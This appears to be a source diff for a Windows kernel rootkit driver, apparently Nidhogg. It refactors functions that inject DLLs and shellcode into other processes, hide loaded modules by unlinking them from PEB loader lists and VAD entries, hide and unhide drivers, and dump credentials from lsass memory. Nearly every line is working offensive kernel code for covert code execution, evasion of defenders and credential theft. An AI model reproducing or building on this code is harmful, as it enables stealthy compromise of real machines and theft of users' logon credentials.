@@ -2,32 +2,25 @@
 #include "MemoryHandler.h"
 
 MemoryHandler::MemoryHandler() {
-	NtCreateThreadEx = NULL;
-	ssdt = NULL;
-
 	lsassMetadata.Collected = false;
 	lsassMetadata.DesKey = NULL;
 	lsassMetadata.IvAddress = NULL;
 	lsassMetadata.LogonSessionList = NULL;
 	lsassMetadata.Lock.Init();
 	cachedLsassInfo.Count = 0;
+	cachedLsassInfo.AllocationSize = nullptr;
 	cachedLsassInfo.Creds = NULL;
 	cachedLsassInfo.DesKey.Data = NULL;
 	cachedLsassInfo.Lock.Init();
 
 	if (!InitializeList(&hiddenDrivers) || !InitializeList(&hiddenModules))
 		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);
-
-	__try {
-		ssdt = GetSSDTAddress();
-		NtCreateThreadEx = static_cast<tNtCreateThreadEx>(GetSSDTFunctionAddress(ssdt, "NtCreateThreadEx"));
-	}
-	__except (EXCEPTION_EXECUTE_HANDLER) {
-		ExRaiseStatus(GetExceptionCode());
-	}
 }
 
 MemoryHandler::~MemoryHandler() {
+	IrqlGuard guard;
+	guard.SetExitIrql(PASSIVE_LEVEL);
+
 	auto driverCleaner = [](_In_ HiddenDriverEntry* item) -> void {
 		NidhoggMemoryHandler->UnhideDriver(item->DriverPath);
 	};
@@ -36,10 +29,14 @@ MemoryHandler::~MemoryHandler() {
 		NidhoggMemoryHandler->RestoreModule(item);
 	};
 	ClearList<HiddenItemsList, HiddenDriverEntry>(&hiddenDrivers, driverCleaner);
+	FreeVirtualMemory(this->hiddenDrivers.Items);
 	ClearList<HiddenItemsList, HiddenModuleEntry>(&hiddenModules, moduleCleaner);
+	FreeVirtualMemory(this->hiddenModules.Items);
 
 	AutoLock lsassLock(cachedLsassInfo.Lock);
+	FreeVirtualMemory(cachedLsassInfo.AllocationSize);
 	FreeVirtualMemory(cachedLsassInfo.DesKey.Data);
+	FreeVirtualMemory(cachedLsassInfo.Iv.Data);
 
 	if (cachedLsassInfo.Creds) {
 		if (cachedLsassInfo.Count != 0) {
@@ -72,28 +69,57 @@ MemoryHandler::~MemoryHandler() {
 * Returns:
 * @status  [NTSTATUS]			  -- Whether successfuly injected or not.
 */
+_IRQL_requires_(PASSIVE_LEVEL)
 NTSTATUS MemoryHandler::InjectDllAPC(_In_ IoctlDllInfo& dllInfo) {
+	PVOID dllPathAddress = nullptr;
 	IoctlShellcodeInfo shellcodeInfo{};
-	SIZE_T dllPathSize = strlen(dllInfo.DllPath) + 1;
 	NTSTATUS status = STATUS_SUCCESS;
-	PVOID loadLibraryAddress = GetUserModeFuncAddress("LoadLibraryA", L"\\Windows\\System32\\kernel32.dll");
+	WCHAR* mainDriveLetter = nullptr;
+	PVOID loadLibraryAddress = nullptr;
+	SIZE_T dllPathSize = strlen(dllInfo.DllPath) + 1;
+	const WCHAR kernel32[] = L"\\Windows\\System32\\kernel32.dll";
+	MemoryAllocator<WCHAR*> fullPath((DRIVE_LETTER_SIZE + wcslen(kernel32)) * sizeof(WCHAR));
 
-	if (!loadLibraryAddress)
-		return STATUS_ABANDONED;
+	if (!fullPath.IsValid())
+		return STATUS_INSUFFICIENT_RESOURCES;
+
+	__try {
+		mainDriveLetter = GetMainDriveLetter();
+		errno_t err = wcscpy_s(fullPath.Get(), DRIVE_LETTER_SIZE * sizeof(WCHAR), mainDriveLetter);
+
+		if (err != 0)
+			ExRaiseStatus(STATUS_INVALID_PARAMETER);
+		err = wcscat_s(fullPath.Get(), wcslen(kernel32) * sizeof(WCHAR), kernel32);
+
+		if (err != 0)
+			ExRaiseStatus(STATUS_INVALID_PARAMETER);
+		loadLibraryAddress = GetUserModeFuncAddress("LoadLibraryA", fullPath.Get(), dllInfo.Pid);
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		FreeVirtualMemory(mainDriveLetter);
+		return GetExceptionCode();
+	}
+	FreeVirtualMemory(mainDriveLetter);
 
 	// Creating the shellcode information for APC injection.
-	WindowsMemoryAllocator<PVOID> allocator(shellcodeInfo.Parameter1, &dllPathSize, PAGE_READWRITE, &status);
+	status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &dllPathAddress, 0, &dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-	if (!NT_SUCCESS(status))
+	if (!NT_SUCCESS(status) || !dllPathAddress) {
+		if (NT_SUCCESS(status))
+			status = STATUS_INSUFFICIENT_RESOURCES;
 		return status;
+	}
+	memset(dllPathAddress, 0, dllPathSize);
 
 	dllPathSize = strlen(dllInfo.DllPath) + 1;
-	status = WriteProcessMemory(dllInfo.DllPath, PsGetCurrentProcess(), shellcodeInfo.Parameter1, strlen(dllInfo.DllPath),
-		KernelMode, false);
+	status = WriteProcessMemory(&(dllInfo.DllPath), PsGetCurrentProcess(), dllPathAddress, dllPathSize, KernelMode);
 
-	if (!NT_SUCCESS(status))
+	if (!NT_SUCCESS(status)) {
+		ZwFreeVirtualMemory(ZwCurrentProcess(), &dllPathAddress, &dllPathSize, MEM_DECOMMIT);
 		return status;
+	}
 
+	shellcodeInfo.Parameter1 = dllPathAddress;
 	shellcodeInfo.Parameter1Size = dllPathSize;
 	shellcodeInfo.Parameter2 = NULL;
 	shellcodeInfo.Parameter3 = NULL;
@@ -102,6 +128,7 @@ NTSTATUS MemoryHandler::InjectDllAPC(_In_ IoctlDllInfo& dllInfo) {
 	shellcodeInfo.ShellcodeSize = sizeof(PVOID);
 
 	status = InjectShellcodeAPC(shellcodeInfo, true);
+	ZwFreeVirtualMemory(ZwCurrentProcess(), &dllPathAddress, &dllPathSize, MEM_DECOMMIT);
 	return status;
 }
 
@@ -116,7 +143,7 @@ NTSTATUS MemoryHandler::InjectDllAPC(_In_ IoctlDllInfo& dllInfo) {
 * @status  [NTSTATUS]			  -- Whether successfuly injected or not.
 */
 _IRQL_requires_max_(APC_LEVEL)
-NTSTATUS MemoryHandler::InjectDllThread(_In_ IoctlDllInfo& dllInfo) {
+NTSTATUS MemoryHandler::InjectDllThread(_In_ IoctlDllInfo& dllInfo) const {
 	OBJECT_ATTRIBUTES objAttr{};
 	CLIENT_ID cid = { 0 };
 	HANDLE hProcess = NULL;
@@ -124,20 +151,38 @@ NTSTATUS MemoryHandler::InjectDllThread(_In_ IoctlDllInfo& dllInfo) {
 	PEPROCESS targetProcess = NULL;
 	PVOID remoteAddress = NULL;
 	PVOID loadLibraryAddress = nullptr;
+	WCHAR* mainDriveLetter = nullptr;
 	HANDLE pid = UlongToHandle(dllInfo.Pid);
 	SIZE_T pathLength = strlen(dllInfo.DllPath) + 1;
 	NTSTATUS status = PsLookupProcessByProcessId(pid, &targetProcess);
 
 	if (!NT_SUCCESS(status))
 		return status;
+	const WCHAR kernel32[] = L"\\Windows\\System32\\kernel32.dll";
+	MemoryAllocator<WCHAR*> fullPath((DRIVE_LETTER_SIZE + wcslen(kernel32)) * sizeof(WCHAR));
 
+	if (!fullPath.IsValid())
+		return STATUS_INSUFFICIENT_RESOURCES;
+
+	IrqlGuard irqlGuard(PASSIVE_LEVEL);
 	__try {
-		loadLibraryAddress = GetUserModeFuncAddress("LoadLibraryA", L"\\Windows\\System32\\kernel32.dll", dllInfo.Pid);
+		mainDriveLetter = GetMainDriveLetter();
+		errno_t err = wcscpy_s(fullPath.Get(), DRIVE_LETTER_SIZE * sizeof(WCHAR), mainDriveLetter);
+
+		if (err != 0)
+			ExRaiseStatus(STATUS_INVALID_PARAMETER);
+		err = wcscat_s(fullPath.Get(), wcslen(kernel32) * sizeof(WCHAR), kernel32);
+
+		if (err != 0)
+			ExRaiseStatus(STATUS_INVALID_PARAMETER);
+		loadLibraryAddress = GetUserModeFuncAddress("LoadLibraryA", fullPath.Get(), dllInfo.Pid);
 	}
 	__except (EXCEPTION_EXECUTE_HANDLER) {
-		ObDereferenceObject(targetProcess);
+		FreeVirtualMemory(mainDriveLetter);
 		return GetExceptionCode();
 	}
+	FreeVirtualMemory(mainDriveLetter);
+	irqlGuard.UnsetIrql();
 
 	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
 	cid.UniqueProcess = pid;
@@ -170,13 +215,18 @@ NTSTATUS MemoryHandler::InjectDllThread(_In_ IoctlDllInfo& dllInfo) {
 	}
 
 	// Making sure that for the creation the thread has access to kernel addresses and restoring the permissions right after.
-	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
-	PCHAR previousMode = reinterpret_cast<PCHAR>(reinterpret_cast<PUCHAR>(PsGetCurrentThread()) + THREAD_PREVIOUSMODE_OFFSET);
-	CHAR tmpPreviousMode = *previousMode;
-	*previousMode = KernelMode;
-	status = this->NtCreateThreadEx(&hTargetThread, THREAD_ALL_ACCESS, &objAttr, hProcess, static_cast<PTHREAD_START_ROUTINE>(loadLibraryAddress),
-		remoteAddress, 0, NULL, NULL, NULL, NULL);
-	*previousMode = tmpPreviousMode;
+	status = RtlCreateUserThread(
+		hProcess,
+		NULL,
+		FALSE,
+		0,
+		0,
+		0,
+		reinterpret_cast<PUSER_THREAD_START_ROUTINE>(loadLibraryAddress),
+		remoteAddress,
+		&hTargetThread,
+		&cid
+	);
 
 	if (hTargetThread)
 		ZwClose(hTargetThread);
@@ -323,16 +373,16 @@ NTSTATUS MemoryHandler::InjectShellcodeAPC(_In_ IoctlShellcodeInfo& shellcodeInf
 * @status		 [NTSTATUS]					  -- Whether successfuly injected or not.
 */
 _IRQL_requires_max_(APC_LEVEL)
-NTSTATUS MemoryHandler::InjectShellcodeThread(_In_ IoctlShellcodeInfo& shellcodeInfo) {
+NTSTATUS MemoryHandler::InjectShellcodeThread(_In_ IoctlShellcodeInfo& shellcodeInfo) const {
 	OBJECT_ATTRIBUTES objAttr{};
 	CLIENT_ID cid = { 0 };
 	HANDLE hProcess = NULL;
 	HANDLE hTargetThread = NULL;
-	PEPROCESS TargetProcess = NULL;
+	PEPROCESS targetProcess = NULL;
 	PVOID remoteAddress = NULL;
 	SIZE_T shellcodeSize = shellcodeInfo.ShellcodeSize;
 	HANDLE pid = UlongToHandle(shellcodeInfo.Pid);
-	NTSTATUS status = PsLookupProcessByProcessId(pid, &TargetProcess);
+	NTSTATUS status = PsLookupProcessByProcessId(pid, &targetProcess);
 
 	if (!NT_SUCCESS(status))
 		return status;
@@ -341,7 +391,7 @@ NTSTATUS MemoryHandler::InjectShellcodeThread(_In_ IoctlShellcodeInfo& shellcode
 	cid.UniqueProcess = pid;
 	cid.UniqueThread = NULL;
 	status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);
-
+	
 	do {
 		if (!NT_SUCCESS(status))
 			break;
@@ -350,19 +400,24 @@ NTSTATUS MemoryHandler::InjectShellcodeThread(_In_ IoctlShellcodeInfo& shellcode
 		if (!NT_SUCCESS(status))
 			break;
 		shellcodeSize = shellcodeInfo.ShellcodeSize;
-		status = WriteProcessMemory(shellcodeInfo.Shellcode, TargetProcess, remoteAddress, shellcodeSize, UserMode);
+		status = WriteProcessMemory(shellcodeInfo.Shellcode, targetProcess, remoteAddress, shellcodeSize, KernelMode);
 
 		if (!NT_SUCCESS(status))
 			break;
 
 		// Making sure that for the creation the thread has access to kernel addresses and restoring the permissions right after.
-		InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
-		PCHAR previousMode = reinterpret_cast<PCHAR>(reinterpret_cast<PUCHAR>(PsGetCurrentThread()) + THREAD_PREVIOUSMODE_OFFSET);
-		CHAR tmpPreviousMode = *previousMode;
-		*previousMode = KernelMode;
-		status = this->NtCreateThreadEx(&hTargetThread, THREAD_ALL_ACCESS, &objAttr, hProcess, 
-			static_cast<PTHREAD_START_ROUTINE>(remoteAddress), NULL, 0, NULL, NULL, NULL, NULL);
-		*previousMode = tmpPreviousMode;
+		status = RtlCreateUserThread(
+			hProcess,
+			NULL,
+			FALSE,
+			0,
+			0,
+			0,
+			reinterpret_cast<PUSER_THREAD_START_ROUTINE>(remoteAddress),
+			remoteAddress,
+			&hTargetThread,
+			&cid
+		);
 
 	} while (false);
 
@@ -375,8 +430,8 @@ NTSTATUS MemoryHandler::InjectShellcodeThread(_In_ IoctlShellcodeInfo& shellcode
 	if (hProcess)
 		ZwClose(hProcess);
 
-	if (TargetProcess)
-		ObDereferenceObject(TargetProcess);
+	if (targetProcess)
+		ObDereferenceObject(targetProcess);
 
 	return status;
 }
@@ -395,33 +450,15 @@ _IRQL_requires_max_(APC_LEVEL)
 NTSTATUS MemoryHandler::PatchModule(_In_ IoctlPatchedModule& moduleInformation) {
 	PEPROCESS targetProcess = nullptr;
 	PVOID functionAddress = NULL;
-	WCHAR* moduleName = NULL;
-	CHAR* functionName = NULL;
-	NTSTATUS status = STATUS_UNSUCCESSFUL;
-
-	// Copying the values to local variables before they are unaccesible because of KeStackAttachProcess.
-	SIZE_T moduleNameSize = (wcslen(moduleInformation.ModuleName) + 1) * sizeof(WCHAR);
-	MemoryAllocator<WCHAR*> moduleNameAllocator(&moduleName, moduleNameSize);
-	status = moduleNameAllocator.CopyData(moduleInformation.ModuleName, moduleNameSize);
-
-	if (!NT_SUCCESS(status))
-		return status;
-
-	SIZE_T functionNameSize = (wcslen(moduleInformation.ModuleName) + 1) * sizeof(WCHAR);
-	MemoryAllocator<CHAR*> functionNameAllocator(&functionName, functionNameSize);
-	status = functionNameAllocator.CopyData(moduleInformation.FunctionName, functionNameSize);
-
-	if (!NT_SUCCESS(status))
-		return status;
-
-	status = PsLookupProcessByProcessId(ULongToHandle(moduleInformation.Pid), &targetProcess);
+	
+	NTSTATUS status = PsLookupProcessByProcessId(ULongToHandle(moduleInformation.Pid), &targetProcess);
 
 	if (!NT_SUCCESS(status))
 		return status;
 
 	// Getting the PEB.
 	__try {
-		functionAddress = GetUserModeFuncAddress(functionName, moduleInformation.ModuleName, moduleInformation.Pid);
+		functionAddress = GetUserModeFuncAddress(moduleInformation.FunctionName, moduleInformation.ModuleName, moduleInformation.Pid);
 	}
 	__except (EXCEPTION_EXECUTE_HANDLER) {
 		ObDereferenceObject(targetProcess);
@@ -444,7 +481,7 @@ NTSTATUS MemoryHandler::PatchModule(_In_ IoctlPatchedModule& moduleInformation) 
 */
 _IRQL_requires_max_(APC_LEVEL)
 NTSTATUS MemoryHandler::HideModule(_In_ IoctlHiddenModuleInfo& moduleInformation) {
-	PLDR_DATA_TABLE_ENTRY pebEntry;
+	PLDR_DATA_TABLE_ENTRY pebEntry = nullptr;
 	KAPC_STATE state;
 	NTSTATUS status = STATUS_SUCCESS;
 	PEPROCESS targetProcess = NULL;
@@ -453,73 +490,117 @@ NTSTATUS MemoryHandler::HideModule(_In_ IoctlHiddenModuleInfo& moduleInformation
 	HiddenModuleEntry entry = { 0 };
 	time.QuadPart = ONE_SECOND;
 
+	if (!moduleInformation.ModuleName || moduleInformation.Pid == SYSTEM_PROCESS_PID)
+		return STATUS_INVALID_PARAMETER;
+	SIZE_T moduleNameLen = wcslen(moduleInformation.ModuleName);
+
 	// Getting the process's PEB.
 	status = PsLookupProcessByProcessId(ULongToHandle(moduleInformation.Pid), &targetProcess);
 
 	if (!NT_SUCCESS(status))
 		return status;
 
-	KeStackAttachProcess(targetProcess, &state);
-	PREALPEB targetPeb = reinterpret_cast<PREALPEB>(PsGetProcessPeb(targetProcess));
+	entry.ModuleName = AllocateMemory<WCHAR*>((moduleNameLen + 1) * sizeof(WCHAR));
 
-	if (!targetPeb) {
-		KeUnstackDetachProcess(&state);
+	if (!entry.ModuleName) {
 		ObDereferenceObject(targetProcess);
-		return STATUS_ABANDONED;
+		return STATUS_INSUFFICIENT_RESOURCES;
 	}
+	errno_t err = wcscpy_s(entry.ModuleName, (moduleNameLen + 1) * sizeof(WCHAR), moduleInformation.ModuleName);
 
-	for (UINT16 i = 0; !targetPeb->LoaderData && i < 10; i++) {
-		KeDelayExecutionThread(KernelMode, FALSE, &time);
-	}
-
-	if (!targetPeb->LoaderData) {
-		KeUnstackDetachProcess(&state);
+	if (err != 0) {
+		FreeVirtualMemory(entry.ModuleName);
 		ObDereferenceObject(targetProcess);
-		return STATUS_ABANDONED_WAIT_0;
+		return STATUS_INVALID_PARAMETER;
 	}
 
-	if (!&targetPeb->LoaderData->InLoadOrderModuleList) {
-		KeUnstackDetachProcess(&state);
-		ObDereferenceObject(targetProcess);
-		return STATUS_ABANDONED_WAIT_0;
-	}
+	do {
+		KeStackAttachProcess(targetProcess, &state);
+		PREALPEB targetPeb = reinterpret_cast<PREALPEB>(PsGetProcessPeb(targetProcess));
 
-	// Finding the module inside the process.
-	status = STATUS_NOT_FOUND;
+		if (!targetPeb) {
+			KeUnstackDetachProcess(&state);
+			status = STATUS_ABANDONED;
+			break;
+		}
 
-	for (PLIST_ENTRY pListEntry = targetPeb->LoaderData->InLoadOrderModuleList.Flink;
-		pListEntry != &targetPeb->LoaderData->InLoadOrderModuleList;
-		pListEntry = pListEntry->Flink) {
+		for (UINT16 i = 0; !targetPeb->LoaderData && i < 10; i++) {
+			KeDelayExecutionThread(KernelMode, FALSE, &time);
+		}
 
-		pebEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+		if (!targetPeb->LoaderData) {
+			KeUnstackDetachProcess(&state);
+			status = STATUS_ABANDONED_WAIT_0;
+			break;
+		}
 
-		if (pebEntry) {
-			if (pebEntry->FullDllName.Length > 0) {
-				if (_wcsnicmp(pebEntry->FullDllName.Buffer, moduleInformation.ModuleName, pebEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
-					entry.ModuleName = moduleInformation.ModuleName;
-					entry.Pid = moduleInformation.Pid;
-					entry.Links.InLoadOrderLinks = pebEntry->InLoadOrderLinks;
-					entry.Links.InInitializationOrderLinks = pebEntry->InInitializationOrderLinks;
-					entry.Links.InMemoryOrderLinks = pebEntry->InMemoryOrderLinks;
-					entry.Links.HashLinks = pebEntry->HashLinks;
-					moduleBase = pebEntry->DllBase;
-					RemoveEntryList(&pebEntry->InLoadOrderLinks);
-					RemoveEntryList(&pebEntry->InInitializationOrderLinks);
-					RemoveEntryList(&pebEntry->InMemoryOrderLinks);
-					RemoveEntryList(&pebEntry->HashLinks);
-					status = STATUS_SUCCESS;
-					break;
-				}
+		if (!&targetPeb->LoaderData->InLoadOrderModuleList) {
+			KeUnstackDetachProcess(&state);
+			status = STATUS_ABANDONED_WAIT_0;
+			break;
+		}
+
+		// Finding the module inside the process.
+		status = STATUS_NOT_FOUND;
+
+		for (PLIST_ENTRY pListEntry = targetPeb->LoaderData->InLoadOrderModuleList.Flink;
+			pListEntry != &targetPeb->LoaderData->InLoadOrderModuleList;
+			pListEntry = pListEntry->Flink) {
+
+			pebEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+
+			if (!pebEntry) {
+				continue;
+			}
+
+			if (pebEntry->FullDllName.Length / sizeof(WCHAR) != moduleNameLen) {
+				continue;
+			}
+
+			if (_wcsnicmp(pebEntry->FullDllName.Buffer, moduleInformation.ModuleName, moduleNameLen) == 0) {
+				entry.OriginalEntry = pListEntry;
+				entry.Pid = moduleInformation.Pid;
+				entry.Links.InLoadOrderLinks = pebEntry->InLoadOrderLinks;
+				entry.Links.InInitializationOrderLinks = pebEntry->InInitializationOrderLinks;
+				entry.Links.InMemoryOrderLinks = pebEntry->InMemoryOrderLinks;
+				entry.Links.HashLinks = pebEntry->HashLinks;
+				moduleBase = pebEntry->DllBase;
+				RemoveEntryList(&pebEntry->InLoadOrderLinks);
+				RemoveEntryList(&pebEntry->InInitializationOrderLinks);
+				RemoveEntryList(&pebEntry->InMemoryOrderLinks);
+				RemoveEntryList(&pebEntry->HashLinks);
+				status = STATUS_SUCCESS;
+				break;
 			}
 		}
+		KeUnstackDetachProcess(&state);
+	} while (false);
+
+	if (!NT_SUCCESS(status)) {
+		FreeVirtualMemory(entry.ModuleName);
+		ObDereferenceObject(targetProcess);
+		return status;
 	}
-	KeUnstackDetachProcess(&state);
+	status = VadHideObject(targetProcess, reinterpret_cast<ULONG_PTR>(moduleBase), entry);
 
-	if (NT_SUCCESS(status))
-		status = VadHideObject(targetProcess, reinterpret_cast<ULONG_PTR>(moduleBase), entry);
+	// Need to handle the case where the module is incorrectly hidden carefully to avoid BSOD.
+	if (!NT_SUCCESS(status)) {
+		if (!NT_SUCCESS(RestorePebModule(targetProcess, &entry)))
+			status = STATUS_UNSUCCESSFUL;
+		FreeVirtualMemory(entry.ModuleName);
+		ObDereferenceObject(targetProcess);
+		return status;
+	}
 
-	if (NT_SUCCESS(status))
-		AddHiddenModule(entry);
+	if (!AddHiddenModule(entry)) {
+		ObDereferenceObject(targetProcess);
+		status = RestoreModule(&entry);
+
+		if (NT_SUCCESS(status))
+			status = STATUS_INSUFFICIENT_RESOURCES;
+		return status;
+	}
+
 	ObDereferenceObject(targetProcess);
 	return status;
 }
@@ -572,8 +653,7 @@ void MemoryHandler::RestoreModules(_In_ ULONG pid) {
 */
 _IRQL_requires_max_(APC_LEVEL)
 NTSTATUS MemoryHandler::RestoreModule(_In_ HiddenModuleEntry* moduleEntry) {
-	PLDR_DATA_TABLE_ENTRY pebEntry;
-	KAPC_STATE state;
+	KAPC_STATE state = { 0 };
 	NTSTATUS status = STATUS_SUCCESS;
 	PEPROCESS targetProcess = NULL;
 	LARGE_INTEGER time = { 0 };
@@ -585,50 +665,133 @@ NTSTATUS MemoryHandler::RestoreModule(_In_ HiddenModuleEntry* moduleEntry) {
 
 	if (!NT_SUCCESS(status))
 		return status;
-	KeStackAttachProcess(targetProcess, &state);
-	PREALPEB targetPeb = reinterpret_cast<PREALPEB>(PsGetProcessPeb(targetProcess));
+	status = RestorePebModule(targetProcess, moduleEntry);
 
-	if (!targetPeb) {
-		KeUnstackDetachProcess(&state);
+	if (!NT_SUCCESS(status)) {
 		ObDereferenceObject(targetProcess);
-		return STATUS_ABANDONED;
+		return status;
 	}
-
-	for (UINT16 i = 0; !targetPeb->LoaderData && i < 10; i++) {
-		KeDelayExecutionThread(KernelMode, FALSE, &time);
-	}
-
-	if (!targetPeb->LoaderData) {
-		KeUnstackDetachProcess(&state);
-		ObDereferenceObject(targetProcess);
-		return STATUS_ABANDONED_WAIT_0;
-	}
-
-	if (!&targetPeb->LoaderData->InLoadOrderModuleList) {
-		KeUnstackDetachProcess(&state);
-		ObDereferenceObject(targetProcess);
-		return STATUS_ABANDONED_WAIT_0;
-	}
-
-	PLIST_ENTRY pListEntry = targetPeb->LoaderData->InLoadOrderModuleList.Flink;
-	pebEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
-
-	if (pebEntry) {
-		InsertTailList(&pebEntry->InLoadOrderLinks, &moduleEntry->Links.InLoadOrderLinks);
-		InsertTailList(&pebEntry->InInitializationOrderLinks, &moduleEntry->Links.InInitializationOrderLinks);
-		InsertTailList(&pebEntry->InMemoryOrderLinks, &moduleEntry->Links.InMemoryOrderLinks);
-		InsertTailList(&pebEntry->HashLinks, &moduleEntry->Links.HashLinks);
-		status = STATUS_SUCCESS;
-	}
-	KeUnstackDetachProcess(&state);
 
 	if (NT_SUCCESS(status))
 		status = VadRestoreObject(targetProcess, moduleEntry->VadNode, moduleEntry->ModuleName);
 	FreeVirtualMemory(moduleEntry->ModuleName);
+	FreeVirtualMemory(moduleEntry->VadModuleName);
 
-	if (RemoveListEntry(&hiddenModules, moduleEntry))
+	if (IsValidListEntry(&moduleEntry->Entry) && !RemoveListEntry(&hiddenModules, moduleEntry))
 		status = STATUS_UNSUCCESSFUL;
 	ObDereferenceObject(targetProcess);
+	return status;
+}
+
+/*
+* Description:
+* RestorePebModule is responsible for restoring a hidden user mode module that is loaded in a process.
+* 
+* Parameters:
+* @process		[_In_ PEPROCESS&]		  -- Required information, contains the process's EPROCESS.
+* @moduleEntry	[_In_ HiddenModuleEntry&] -- Required information, contains the module's entry.
+* 
+* Returns:
+* @status		[NTSTATUS]				  -- Whether successfuly restored or not.
+*/
+_IRQL_requires_max_(APC_LEVEL)
+NTSTATUS MemoryHandler::RestorePebModule(_In_ PEPROCESS& process, _In_ HiddenModuleEntry* moduleEntry) {
+	KAPC_STATE state = { 0 };
+	PLDR_DATA_TABLE_ENTRY pebEntry = nullptr;
+	LARGE_INTEGER time = { 0 };
+	NTSTATUS status = STATUS_UNSUCCESSFUL;
+	time.QuadPart = ONE_SECOND;
+
+	constexpr auto RestoreEntry = [](PLDR_DATA_TABLE_ENTRY pebEntry, HiddenModuleEntry* entry) -> bool {
+		if ((!IsValidListEntry(&pebEntry->InLoadOrderLinks) && IsValidListEntry(&entry->Links.InLoadOrderLinks)) || 
+			(!IsValidListEntry(&pebEntry->InInitializationOrderLinks) && IsValidListEntry(&entry->Links.InInitializationOrderLinks)) ||
+			(!IsValidListEntry(&pebEntry->InMemoryOrderLinks) && IsValidListEntry(&entry->Links.InMemoryOrderLinks)) ||
+			(!IsValidListEntry(&pebEntry->HashLinks) && IsValidListEntry(&entry->Links.HashLinks))) {
+			return false;
+		}
+		__try {
+			if (IsValidListEntry(&entry->Links.InLoadOrderLinks))
+				InsertHeadList(&pebEntry->InLoadOrderLinks, &entry->Links.InLoadOrderLinks);
+			if (IsValidListEntry(&entry->Links.InInitializationOrderLinks))
+				InsertHeadList(&pebEntry->InInitializationOrderLinks, &entry->Links.InInitializationOrderLinks);
+			if (IsValidListEntry(&entry->Links.InMemoryOrderLinks))
+				InsertHeadList(&pebEntry->InMemoryOrderLinks, &entry->Links.InMemoryOrderLinks);
+			if (IsValidListEntry(&entry->Links.HashLinks))
+				InsertHeadList(&pebEntry->HashLinks, &entry->Links.HashLinks);
+		}
+		__except (EXCEPTION_EXECUTE_HANDLER) {
+			return false;
+		}
+		return true;
+	};
+
+	if (!process || !moduleEntry)
+		return STATUS_INVALID_PARAMETER;
+	KeStackAttachProcess(process, &state);
+
+	do {
+		PREALPEB targetPeb = reinterpret_cast<PREALPEB>(PsGetProcessPeb(process));
+
+		if (!targetPeb) {
+			status = STATUS_ABANDONED;
+			break;
+		}
+
+		for (UINT16 i = 0; !targetPeb->LoaderData && i < 10; i++) {
+			KeDelayExecutionThread(KernelMode, FALSE, &time);
+		}
+
+		if (!targetPeb->LoaderData) {
+			status = STATUS_ABANDONED_WAIT_0;
+			break;
+		}
+
+		if (!&targetPeb->LoaderData->InLoadOrderModuleList) {
+			status = STATUS_ABANDONED_WAIT_0;
+			break;
+		}
+
+		// First validate that moduleEntry->OriginalEntry is valid before accessing its members
+		if (!moduleEntry->OriginalEntry || !IsValidListEntry(moduleEntry->OriginalEntry)) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		if (moduleEntry->OriginalEntry->Blink && IsValidListEntry(moduleEntry->OriginalEntry->Blink)) {
+			pebEntry = CONTAINING_RECORD(moduleEntry->OriginalEntry->Blink, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+
+			if (RestoreEntry(pebEntry, moduleEntry)) {
+				status = STATUS_SUCCESS;
+				break;
+			}
+		}
+			
+		if (moduleEntry->OriginalEntry->Flink && IsValidListEntry(moduleEntry->OriginalEntry->Flink)) {
+			pebEntry = CONTAINING_RECORD(moduleEntry->OriginalEntry->Flink, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+
+			if (RestoreEntry(pebEntry, moduleEntry)) {
+				status = STATUS_SUCCESS;
+				break;
+			}
+		}
+
+		// Fallback: iterate through the entire list
+		for (PLIST_ENTRY pListEntry = targetPeb->LoaderData->InLoadOrderModuleList.Flink;
+			pListEntry != &targetPeb->LoaderData->InLoadOrderModuleList;
+			pListEntry = pListEntry->Flink) {
+
+			pebEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+
+			if (pebEntry && IsValidListEntry(&pebEntry->InLoadOrderLinks)) {
+				if (RestoreEntry(pebEntry, moduleEntry)) {
+					status = STATUS_SUCCESS;
+					break;
+				}
+			}
+		}
+	} while (false);
+	
+	KeUnstackDetachProcess(&state);
 	return status;
 }
 
@@ -702,7 +865,7 @@ NTSTATUS MemoryHandler::UnhideDriver(_In_ wchar_t* driverPath) {
 	NTSTATUS status = STATUS_SUCCESS;
 	HiddenDriverEntry* driverEntry = nullptr;
 
-	if (!FindHiddenDriver(driverPath, driverEntry))
+	if (!FindHiddenDriver(driverPath, &driverEntry))
 		return STATUS_NOT_FOUND;
 
 	if (!ExAcquireResourceExclusiveLite(PsLoadedModuleResource, 1))
@@ -712,7 +875,7 @@ NTSTATUS MemoryHandler::UnhideDriver(_In_ wchar_t* driverPath) {
 	loadedModulesEntry = CONTAINING_RECORD(pListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
 	InsertTailList(&loadedModulesEntry->InLoadOrderLinks, reinterpret_cast<PLIST_ENTRY>(driverEntry->OriginalEntry));
 
-	if (RemoveListEntry(&hiddenDrivers, driverEntry))
+	if (!RemoveListEntry(&hiddenDrivers, driverEntry))
 		status = STATUS_UNSUCCESSFUL;
 
 	ExReleaseResourceLite(PsLoadedModuleResource);
@@ -724,13 +887,13 @@ NTSTATUS MemoryHandler::UnhideDriver(_In_ wchar_t* driverPath) {
 * DumpCredentials is responsible for dumping credentials from lsass.
 *
 * Parameters:
-* allocationSize [_Out_ SIZE_T*] -- Size to allocate for credentials buffer.
+* allocationSize [_Out_ PSIZE_T] -- Size to allocate for credentials buffer.
 *
 * Returns:
 * @status		 [NTSTATUS]		 -- Whether successfuly dumped or not.
 */
 _IRQL_requires_max_(APC_LEVEL)
-NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
